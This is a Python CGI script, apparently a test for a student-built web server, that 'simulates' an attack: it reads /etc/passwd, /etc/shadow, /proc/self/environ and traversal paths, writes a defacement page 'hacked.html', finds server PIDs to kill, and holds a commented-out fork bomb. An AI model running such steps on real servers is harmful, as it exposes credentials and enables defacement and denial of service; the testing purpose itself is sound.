#!/usr/bin/python3
"""
WARNING: This is a demonstration of a potentially harmful script.
Only run this in a controlled test environment.
"""

import os
import sys
import subprocess
import signal
import time

# Print CGI header
print("Content-type: text/html\r\n\r\n")

print("<html>")
print("<head><title>Server Attack Simulation</title></head>")
print("<body>")
print("<h1>Server Attack Simulation</h1>")
print("<p>This script demonstrates potentially dangerous operations that could affect server security.</p>")

print("<h2>Environment Information:</h2>")
print("<pre>")
print(f"Current user: {os.getuid()} ({os.getlogin() if hasattr(os, 'getlogin') else 'unknown'})")
print(f"Current directory: {os.getcwd()}")
print(f"Script path: {__file__}")
print("</pre>")

print("<h2>System Information:</h2>")
print("<pre>")
# Try to get system information
try:
    print("--- Process List ---")
    processes = subprocess.check_output(["ps", "aux"], stderr=subprocess.STDOUT, universal_newlines=True)
    # Look for webserver processes
    for line in processes.split('\n'):
        if "webserv" in line or "httpd" in line or "nginx" in line or "apache" in line:
            print(f"Server process found: {line}")
except Exception as e:
    print(f"Failed to list processes: {e}")
print("</pre>")

print("<h2>Attack Simulation:</h2>")
print("<pre>")

# 1. Try to find the server process
try:
    print("Attempting to find server process...")
    webserver_pids = []
    for line in subprocess.check_output(["ps", "aux"], universal_newlines=True).split('\n'):
        if "webserv" in line and not "python" in line:
            parts = line.split()
            if len(parts) > 1:
                webserver_pids.append(parts[1])
                print(f"Found server process: PID={parts[1]}, CMD={' '.join(parts[10:])}")
    
    if webserver_pids:
        print(f"\nWould attempt to kill PIDs: {', '.join(webserver_pids)}")
        
        # We won't actually kill the process, just demonstrate that we found it
        print("\n[SIMULATION ONLY] Not actually sending kill signal")
        #for pid in webserver_pids:
        #    os.kill(int(pid), signal.SIGTERM)
    else:
        print("No webserver process found")
except Exception as e:
    print(f"Error during process detection: {e}")

# 2. Try to access sensitive files
try:
    print("\nAttempting to access sensitive files...")
    sensitive_files = [
        "/etc/passwd", 
        "/etc/shadow",  # Should require root
        "../../../config/webserv.conf",
        "../../server/Server.cpp",
        "/proc/self/environ"
    ]
    
    for file_path in sensitive_files:
        print(f"\nTrying to read: {file_path}")
        try:
            with open(file_path, 'r') as f:
                content = f.read(200)  # Read first 200 chars
                print(f"SUCCESS! Contents: {content[:50]}..." if content else "File is empty")
        except Exception as e:
            print(f"Failed: {e}")
except Exception as e:
    print(f"File access error: {e}")

# 3. Try to write to a file within the web directory
try:
    print("\nAttempting to create a file...")
    with open("hacked.html", "w") as f:
        f.write("<html><body><h1>This server has been hacked!</h1></body></html>")
    print("Successfully created hacked.html in the current directory")
except Exception as e:
    print(f"Failed to create file: {e}")

# 4. Try to execute a command that could take down the server
print("\nSimulating commands that could affect server performance:")
try:
    print("Would execute: fork bomb (not actually running)")
    # Don't actually run these!
    # fork_bomb = ":(){ :|:& };:"
    # subprocess.run(fork_bomb, shell=True)
    
    print("Would execute: memory exhaustion (not actually running)")
    # Don't actually run these!
    # subprocess.run("dd if=/dev/zero of=/dev/null", shell=True)
except Exception as e:
    print(f"Command execution failed: {e}")

print("</pre>")

print("<h3>Script completed</h3>")
print("<p>In a real attack, this script could have shutdown the server or compromised security.</p>")
print("</body></html>")